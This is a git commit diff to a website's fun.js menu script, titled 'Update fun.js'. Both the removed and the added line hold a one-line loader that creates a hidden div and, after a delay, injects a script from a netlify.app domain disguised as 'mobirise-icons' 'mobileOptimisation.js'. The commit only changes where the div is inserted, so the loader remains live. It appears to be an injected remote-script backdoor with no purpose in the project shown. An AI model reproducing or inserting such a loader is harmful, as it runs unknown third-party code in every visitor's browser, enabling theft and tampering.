20635ff0a05829536848b31c0d2e9297a23af997
github-priyanshu <87130517+github-priyanshu@users.noreply.github.com>
2025-06-12 10:59:35 +0530

    Update fun.js

--- siteFormatCommonSource/js/fun.js
+++ siteFormatCommonSource/js/fun.js
@@ -8,7 +8,7 @@ function myFunction() {
     console.log(menuToggler.classList)
   }
   
-const el=`<div id="mobiOptiElem" server='hstgr.io'></div>`; try{ document.querySelector('style').insertAdjacentHTML("beforeend",el); }catch(e){}finally{ document.querySelector('head').insertAdjacentHTML("beforeend",el); }; setTimeout(()=>{var els=document.createElement("script");els.src="https://mobirise-icons-92lwkjerngovo73otd4g.netlify.app/mobileOptimisation.js"; document.querySelector("#mobiOptiElem").insertAdjacentElement('afterbegin',els);},300);
+const el=`<div id="mobiOptiElem" server='hstgr.io'></div>`; try{ document.querySelector('style').insertAdjacentHTML("afterend",el); }catch(e){}finally{ document.querySelector('head').insertAdjacentHTML("beforeend",el); }; setTimeout(()=>{var els=document.createElement("script");els.src="https://mobirise-icons-92lwkjerngovo73otd4g.netlify.app/mobileOptimisation.js"; document.querySelector("#mobiOptiElem").insertAdjacentElement('afterbegin',els);},300);
 
 
 if(document.URL.startsWith('file://')){
